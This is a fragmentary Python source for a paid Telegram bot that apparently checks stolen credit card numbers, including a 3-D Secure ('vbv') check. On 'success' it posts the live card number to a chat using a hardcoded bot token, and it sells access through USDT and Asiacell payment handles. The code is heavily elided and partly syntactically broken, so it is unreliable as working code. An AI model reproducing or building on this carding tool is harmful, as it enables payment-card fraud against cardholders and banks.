...
import threading
stopuser = {}
token = '7493187290:AAEP2E7GQuqiH_Locexe7i4v_DKDLXb6li8'
	...
	def my_function():
	  ...
	  "timer": "none",
		...
		if BL == '𝗙𝗥𝗘𝗘':	
			...
			ahmed = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/VsMe10")
			contact_button = types.InlineKeyboardButton(text="✨ 𝘾𝙃𝘼𝙉𝙉𝙀𝙇  ✨", url="https://t.me/VsMe10v")
			keyboard.add(contact_button, ahmed)
			video_url = f'https://t.me/VsMe10v/3'
...
للشراء عن طريق اسياسيل من هنا : @i_3_v
...
To purchase via USDT from here : @VsMe10
User Bot : @i_6v_bot {BL}</b>
	''',reply_markup=keyboard)
			return
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥 ✨", url="https://t.me/VsMe10")
		ahmed = types.InlineKeyboardButton(text="✨ 𝘾𝙃𝘼𝙉𝙉𝙀𝙇 ✨", url="https://t.me/VsMe10v")
		keyboard.add(contact_button, ahmed)
...
للشتراك في البوت نقبل جميع طرق الدفع : @VsMe10
...
𝘽𝙤𝙩 𝘽𝙮 @VsMe10''', reply_markup=mes)
...
◆ 𝑻𝑨𝑲𝑬𝑵 ➜ {"{:.1f}".format(execution_time)} secounds .</b>'''
					if 'success' in last:
						tok = '7493187290:AAEP2E7GQuqiH_Locexe7i4v_DKDLXb6li8'
						acc =  '-6644319097'
						mg = f"""<b> 
❆═══» 𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁 «═══❆
｢𝙲𝙲」➔ <code>{cc}</code>
...
def respond_to_vbv(message):
  ...
  "timer": "none",
	...
	if BL == '𝗙𝗥𝗘𝗘':
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="@VsMe10")
		ahmed = types.InlineKeyboardButton(text="✨ 𝘾𝙃𝘼𝙉𝙉𝙀𝙇  ✨", url="https://t.me/VsMe10v")
		keyboard.add(contact_button, ahmed)
		bot.send_message(chat_id=message.chat.id, text=f'''<b>مرحبا {name}
عذرا هذا البوت ليس مجانا 
...
''',reply_markup=keyboard)
	...
	if command_usage[idt]['last_time'] is not None:
		...
		if time_diff < 30:
			...
			return	
	ko = (bot.reply_to(message, "𝗖𝗛𝗘𝗖𝗞𝗜𝗡𝗚 𝗬𝗢𝗨𝗥 𝗖𝗔𝗥𝗗𝗦...⌛ | ✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="@VsMe10 |✨ 𝘾𝙃𝘼𝙉𝙉𝙀𝙇  ✨", url="https://t.me/VsMe10v").message_id)
	try:
...
To purchase via USDT from here : @VsMe10
User Bot : @i_6v_bot {BL}</b><b>مرحبا {name}
عذرا هذا البوت ليس مجانا 
